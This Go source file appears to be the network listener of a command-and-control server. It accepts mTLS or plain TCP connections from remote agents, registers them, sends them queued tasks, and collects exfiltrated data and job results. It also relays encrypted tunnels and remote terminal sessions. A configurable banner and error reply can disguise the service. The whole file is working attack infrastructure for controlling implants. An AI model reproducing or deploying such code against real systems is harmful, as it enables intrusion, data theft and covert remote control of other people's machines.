package main

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/vmihailenco/msgpack/v5"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type TCPConfig struct {
	HostBind           string `json:"host_bind"`
	PortBind           int    `json:"port_bind"`
	Callback_addresses string `json:"callback_addresses"`

	Ssl        bool   `json:"ssl"`
	CaCert     []byte `json:"ca_cert"`
	ServerCert []byte `json:"server_cert"`
	ServerKey  []byte `json:"server_key"`
	ClientCert []byte `json:"client_cert"`
	ClientKey  []byte `json:"client_key"`

	TcpBanner   string `json:"tcp_banner"`
	ErrorAnswer string `json:"error_answer"`
	Timeout     int    `json:"timeout"`

	Protocol   string `json:"protocol"`
	EncryptKey []byte `json:"encrypt_key"`
}

type Connection struct {
	conn         net.Conn
	ctx          context.Context
	handleCancel context.CancelFunc
}

type TCP struct {
	AgentConnects Map
	JobConnects   Map
	Listener      net.Listener
	Config        TCPConfig
	Name          string
	Active        bool
}

const (
	INIT_PACK     = 1
	EXFIL_PACK    = 2
	JOB_PACK      = 3
	TUNNEL_PACK   = 4
	TERMINAL_PACK = 5
)

type StartMsg struct {
	Type int    `msgpack:"id"`
	Data []byte `msgpack:"data"`
}

type InitPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Data []byte `msgpack:"data"`
}

type ExfilPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type JobPack struct {
	Id   uint   `msgpack:"id"`
	Type uint   `msgpack:"type"`
	Task string `msgpack:"task"`
}

type TunnelPack struct {
	Id        uint   `msgpack:"id"`
	Type      uint   `msgpack:"type"`
	ChannelId int    `msgpack:"channel_id"`
	Key       []byte `msgpack:"key"`
	Iv        []byte `msgpack:"iv"`
	Alive     bool   `msgpack:"alive"`
}

type TermPack struct {
	Id     uint   `msgpack:"id"`
	TermId int    `msgpack:"term_id"`
	Key    []byte `msgpack:"key"`
	Iv     []byte `msgpack:"iv"`
	Alive  bool   `msgpack:"alive"`
	Status string `msgpack:"status"`
}

func (handler *TCP) Start(ts Teamserver) error {
	var err error = nil
	address := fmt.Sprintf("%s:%d", handler.Config.HostBind, handler.Config.PortBind)

	if handler.Config.Ssl {
		fmt.Println("  ", "Started mTLS listener: "+address)

		cert, err := tls.X509KeyPair(handler.Config.ServerCert, handler.Config.ServerKey)
		if err != nil {
			return err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(handler.Config.CaCert)
		config := &tls.Config{
			Certificates: []tls.Certificate{cert},
			ClientAuth:   tls.RequireAndVerifyClientCert, // Require client verification
			ClientCAs:    caCertPool,
		}

		handler.Listener, err = tls.Listen("tcp", address, config)
		if err != nil {
			return err
		}

	} else {
		fmt.Println("  ", "Started TCP listener: "+address)

		handler.Listener, err = net.Listen("tcp", address)
		if err != nil {
			return err
		}
	}

	go func() {
		for {
			conn, err := handler.Listener.Accept()
			if err != nil {
				return
			}
			go handler.handleConnection(conn, ts)
		}
	}()
	handler.Active = true

	time.Sleep(500 * time.Millisecond)
	return err
}

func (handler *TCP) handleConnection(conn net.Conn, ts Teamserver) {
	var (
		sendData []byte
		recvData []byte
		err      error
		initMsg  StartMsg
	)

	if len(handler.Config.TcpBanner) > 0 {
		_, _ = conn.Write([]byte(handler.Config.TcpBanner))
	}

	connection := Connection{
		conn: conn,
	}
	connection.ctx, connection.handleCancel = context.WithCancel(context.Background())

	_ = conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	recvData, err = recvMsg(conn)
	_ = conn.SetReadDeadline(time.Time{})
	if err != nil {
		goto ERR
	}

	recvData, err = DecryptData(recvData, handler.Config.EncryptKey)
	if err != nil {
		goto ERR
	}

	err = msgpack.Unmarshal(recvData, &initMsg)
	if err != nil {
		goto ERR
	}

	switch initMsg.Type {

	case INIT_PACK:

		var initPack InitPack
		err := msgpack.Unmarshal(initMsg.Data, &initPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", initPack.Id)
		agentType := fmt.Sprintf("%08x", initPack.Type)
		ExternalIP := strings.Split(conn.RemoteAddr().String(), ":")[0]

		if !ModuleObject.ts.TsAgentIsExists(agentId) {
			err = ModuleObject.ts.TsAgentCreate(agentType, agentId, initPack.Data, handler.Name, ExternalIP, false)
			if err != nil {
				goto ERR
			}
		} else {
			_ = ModuleObject.ts.TsAgentSetMark(agentId, "")
		}

		handler.AgentConnects.Put(agentId, connection)

		for {
			sendData, err = ModuleObject.ts.TsAgentGetHostedTasks(agentId, 0x1900000)
			if err != nil {
				break
			}

			if sendData != nil && len(sendData) > 0 {
				err = sendMsg(conn, sendData)
				if err != nil {
					break
				}

				recvData, err = recvMsg(conn)
				if err != nil {
					break
				}

				_ = ModuleObject.ts.TsAgentProcessData(agentId, recvData)
			} else {
				if !isClientConnected(conn, handler.Config.Ssl) {
					break
				}
			}
		}

		_ = ts.TsAgentSetMark(agentId, "Disconnect")
		handler.AgentConnects.Delete(agentId)
		_ = conn.Close()

	case EXFIL_PACK:

		var exfilPack ExfilPack
		err := msgpack.Unmarshal(initMsg.Data, &exfilPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", exfilPack.Id)

		if !ModuleObject.ts.TsTaskRunningExists(agentId, exfilPack.Task) {
			goto ERR
		}

		jcId := agentId + "-" + exfilPack.Task

		handler.JobConnects.Put(jcId, connection)

		for {
			recvData, err = recvMsg(conn)
			if err != nil {
				break
			}
			_ = ModuleObject.ts.TsAgentProcessData(agentId, recvData)
		}

		handler.JobConnects.Delete(jcId)
		_ = conn.Close()

	case JOB_PACK:

		var jobPack JobPack
		err := msgpack.Unmarshal(initMsg.Data, &jobPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", jobPack.Id)

		if !ModuleObject.ts.TsTaskRunningExists(agentId, jobPack.Task) {
			goto ERR
		}

		jcId := agentId + "-" + jobPack.Task

		handler.JobConnects.Put(jcId, connection)

		for {
			recvData, err = recvMsg(conn)
			if err != nil {
				break
			}
			_ = ModuleObject.ts.TsAgentProcessData(agentId, recvData)
		}

		handler.JobConnects.Delete(jcId)
		_ = conn.Close()

	case TUNNEL_PACK:

		var tunPack TunnelPack
		err := msgpack.Unmarshal(initMsg.Data, &tunPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", tunPack.Id)

		if !ModuleObject.ts.TsTunnelChannelExists(tunPack.ChannelId) {
			goto ERR
		}

		if !tunPack.Alive {
			ts.TsTunnelConnectionClose(tunPack.ChannelId)
			_ = conn.Close()
			return
		}

		ts.TsTunnelConnectionResume(agentId, tunPack.ChannelId, true)

		pr, pw, err := ModuleObject.ts.TsTunnelGetPipe(agentId, tunPack.ChannelId)
		if err != nil {
			goto ERR
		}

		blockEnc, _ := aes.NewCipher(tunPack.Key)
		encStream := cipher.NewCTR(blockEnc, tunPack.Iv)
		encWriter := &cipher.StreamWriter{S: encStream, W: conn}

		blockDec, _ := aes.NewCipher(tunPack.Key)
		decStream := cipher.NewCTR(blockDec, tunPack.Iv)
		decWriter := &cipher.StreamWriter{S: decStream, W: pw}

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = conn.Close()
				_ = pr.Close()
			})
		}

		var wg sync.WaitGroup

		wg.Add(1)
		go func() {
			defer wg.Done()
			io.Copy(encWriter, pr)
			closeAll()
		}()

		wg.Add(1)
		go func() {
			defer wg.Done()
			io.Copy(decWriter, conn)
			closeAll()
		}()

		wg.Wait()

		ts.TsTunnelConnectionClose(tunPack.ChannelId)

	case TERMINAL_PACK:

		var termPack TermPack
		err := msgpack.Unmarshal(initMsg.Data, &termPack)
		if err != nil {
			goto ERR
		}

		agentId := fmt.Sprintf("%08x", termPack.Id)
		terminalId := fmt.Sprintf("%08x", termPack.TermId)

		if !ModuleObject.ts.TsTerminalConnExists(terminalId) {
			goto ERR
		}

		if !termPack.Alive {
			_ = ts.TsAgentTerminalCloseChannel(terminalId, termPack.Status)
			_ = conn.Close()
			return
		}

		ts.TsTerminalConnResume(agentId, terminalId)

		pr, pw, err := ModuleObject.ts.TsTerminalGetPipe(agentId, terminalId)
		if err != nil {
			goto ERR
		}

		blockEnc, _ := aes.NewCipher(termPack.Key)
		encStream := cipher.NewCTR(blockEnc, termPack.Iv)
		encWriter := &cipher.StreamWriter{S: encStream, W: conn}

		blockDec, _ := aes.NewCipher(termPack.Key)
		decStream := cipher.NewCTR(blockDec, termPack.Iv)
		decWriter := &cipher.StreamWriter{S: decStream, W: pw}

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = conn.Close()
				_ = pr.Close()
			})
		}

		var wg sync.WaitGroup

		wg.Add(1)
		go func() {
			defer wg.Done()
			io.Copy(encWriter, pr)
			closeAll()
		}()

		wg.Add(1)
		go func() {
			defer wg.Done()
			io.Copy(decWriter, conn)
			closeAll()
		}()

		wg.Wait()

		_ = ts.TsAgentTerminalCloseChannel(terminalId, "killed")
	}

	return

ERR:
	_ = sendMsg(conn, []byte(handler.Config.ErrorAnswer))
	_ = conn.Close()
}

func (handler *TCP) Stop() error {
	var (
		err          error = nil
		listenerPath       = ListenerDataDir + "/" + handler.Name
	)

	if handler.Listener != nil {
		_ = handler.Listener.Close()
	}

	handler.AgentConnects.ForEach(func(key string, valueConn interface{}) bool {
		connection, _ := valueConn.(Connection)
		if connection.conn != nil {
			connection.handleCancel()
			_ = connection.conn.Close()
		}
		return true
	})

	_, err = os.Stat(listenerPath)
	if err == nil {
		err = os.RemoveAll(listenerPath)
		if err != nil {
			return fmt.Errorf("failed to remove %s folder: %s", listenerPath, err.Error())
		}
	}

	return nil
}

func (handler *TCP) bannerError(conn net.Conn) {
	_, _ = conn.Write([]byte(handler.Config.ErrorAnswer))
	_ = conn.Close()
}

func connRead(conn net.Conn, size int) ([]byte, error) {
	if size <= 0 {
		return nil, fmt.Errorf("incorrected size: %d", size)
	}

	message := make([]byte, 0, size)
	tmpBuff := make([]byte, 1024)
	readSize := 0

	for readSize < size {
		toRead := size - readSize
		if toRead < len(tmpBuff) {
			tmpBuff = tmpBuff[:toRead]
		}

		n, err := conn.Read(tmpBuff)
		if err != nil {
			return nil, err
		}

		message = append(message, tmpBuff[:n]...)
		readSize += n
	}
	return message, nil
}

func recvMsg(conn net.Conn) ([]byte, error) {
	bufLen, err := connRead(conn, 4)
	if err != nil {
		return nil, err
	}
	msgLen := binary.BigEndian.Uint32(bufLen)

	return connRead(conn, int(msgLen))
}

func sendMsg(conn net.Conn, data []byte) error {
	if conn == nil {
		return errors.New("conn is nil")
	}

	msgLen := make([]byte, 4)
	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
	message := append(msgLen, data...)
	_, err := conn.Write(message)
	return err
}

func isClientConnected(conn net.Conn, ssl bool) bool {
	var err error = nil
	if ssl {
		tcpConn, ok := conn.(*tls.Conn)
		if !ok {
			return false
		}
		_ = tcpConn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		buf := make([]byte, 1)
		_, err = conn.Read(buf)
		_ = tcpConn.SetReadDeadline(time.Time{})

	} else {
		tcpConn, ok := conn.(*net.TCPConn)
		if !ok {
			return false
		}
		_ = tcpConn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		buf := make([]byte, 1)
		_, err = conn.Read(buf)
		_ = tcpConn.SetReadDeadline(time.Time{})
	}

	if err != nil {
		if err.Error() == "EOF" || errors.Is(err, net.ErrClosed) {
			return false
		}
	}

	return true
}

func EncryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return nil, err
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)

	return ciphertext, nil
}

func DecryptData(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := data[:nonceSize], data[nonceSize:]

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}
	return plaintext, nil
}
